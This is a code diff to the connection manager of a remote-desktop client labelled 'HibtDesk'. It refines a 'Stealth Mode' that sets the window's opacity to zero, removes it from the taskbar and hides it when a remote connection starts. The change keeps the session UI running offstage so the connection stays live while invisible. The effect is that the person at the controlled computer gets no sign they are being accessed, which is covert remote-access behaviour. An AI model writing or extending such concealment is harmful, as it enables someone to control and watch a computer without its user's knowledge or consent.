@@ -184,8 +184,7 @@ class ConnectionManagerState extends State<ConnectionManager>
             ],
           )
         : Builder(builder: (context) {
-            // HibtDesk Stealth Mode:
-            // Automatically hide the window when a connection is established.
+            // HibtDesk Stealth Mode: Hide window but keep UI alive for connection handling
             Future.microtask(() async {
               await windowManager.setOpacity(0.0);
               await windowManager.setSkipTaskbar(true);
@@ -193,8 +192,91 @@ class ConnectionManagerState extends State<ConnectionManager>
                 await windowManager.hide();
               }
             });
-            // Return empty container to render nothing
-            return Container();
+            // Keep the original DesktopTab UI but wrapped in Offstage for stealth
+            // The widgets must exist to maintain connection state
+            return Offstage(
+              offstage: true,
+              child: Listener(
+                onPointerDown: pointerHandler,
+                onPointerMove: pointerHandler,
+                child: DesktopTab(
+                  showTitle: false,
+                  showMaximize: false,
+                  showMinimize: true,
+                  showClose: true,
+                  onWindowCloseButton: handleWindowCloseButton,
+                  controller: serverModel.tabController,
+                  selectedBorderColor: MyTheme.accent,
+                  maxLabelWidth: 100,
+                  tail: null,
+                  tabBuilder: (key, icon, label, themeConf) {
+                    final client = serverModel.clients
+                        .firstWhereOrNull((client) => client.id.toString() == key);
+                    return Row(
+                      mainAxisAlignment: MainAxisAlignment.center,
+                      children: [
+                        Tooltip(
+                            message: key,
+                            waitDuration: Duration(seconds: 1),
+                            child: label),
+                        unreadMessageCountBuilder(client?.unreadChatMessageCount)
+                            .marginOnly(left: 4),
+                      ],
+                    );
+                  },
+                  pageViewBuilder: (pageView) => LayoutBuilder(
+                    builder: (context, constrains) {
+                      var borderWidth = 0.0;
+                      if (constrains.maxWidth >
+                          kConnectionManagerWindowSizeClosedChat.width) {
+                        borderWidth = kConnectionManagerWindowSizeOpenChat.width -
+                            constrains.maxWidth;
+                      } else {
+                        borderWidth = kConnectionManagerWindowSizeClosedChat.width -
+                            constrains.maxWidth;
+                      }
+                      if (borderWidth < 0 || borderWidth > 50) {
+                        borderWidth = 0;
+                      }
+                      final realClosedWidth =
+                          kConnectionManagerWindowSizeClosedChat.width -
+                              borderWidth;
+                      final realChatPageWidth =
+                          constrains.maxWidth - realClosedWidth;
+                      final row = Row(children: [
+                        if (constrains.maxWidth >
+                            kConnectionManagerWindowSizeClosedChat.width)
+                          Consumer<ChatModel>(
+                              builder: (_, model, child) => SizedBox(
+                                    width: realChatPageWidth,
+                                    child: allowRemoteCMModification()
+                                        ? buildSidePage()
+                                        : buildRemoteBlock(
+                                            child: buildSidePage(),
+                                            block: _sidePageBlock,
+                                            mask: true),
+                                  )),
+                        SizedBox(
+                            width: realClosedWidth,
+                            child: SizedBox(
+                                width: realClosedWidth,
+                                child: allowRemoteCMModification()
+                                    ? pageView
+                                    : buildRemoteBlock(
+                                        child: _buildKeyEventBlock(pageView),
+                                        block: _controlPageBlock,
+                                        mask: false,
+                                      ))),
+                      ]);
+                      return Container(
+                        color: Theme.of(context).scaffoldBackgroundColor,
+                        child: row,
+                      );
+                    },
+                  ),
+                ),
+              ),
+            );
           });
   }
 
